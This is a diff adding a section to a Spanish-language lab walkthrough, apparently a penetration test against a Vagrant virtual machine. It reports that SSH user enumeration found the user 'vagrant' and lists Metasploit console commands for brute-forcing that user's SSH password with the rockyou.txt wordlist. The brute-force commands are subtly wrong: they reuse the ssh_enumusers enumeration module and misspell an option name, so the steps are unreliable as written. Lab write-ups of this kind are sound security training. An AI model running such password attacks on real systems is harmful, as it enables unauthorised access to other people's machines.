@@ -100,6 +100,27 @@ set USER_FIlE /home/user/Downloads/top-usernames-shortlist.txt
 run
 ```
 
+Corriendo ese comando tenemos este resultado
+
+![Resultado con el nombre de usuario](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781448946/Username_vuk1ep.png)
+
+En el resultado obtenido nos indica que el usuario que reconocio es `vagrant`, por lo que ahora es cuestión de encontrar la contraseña de ese usuario, para poder tener acceso vía SSH a la máqina target.
+
+## 3.3 Ataque de Fuerza Bruta en SSHH
+
+Para esta acción usaremos el siguiente comando, considerando que seguimos dentro del `msf console -q`
+
+```
+msf console -q
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS 10.0.2.3
+set USERNAME vagrant
+set PASS_FIlE /home/user/Downloads/rockyou.txt
+set VERBOSE true
+run
+```
+
+
 
 
 
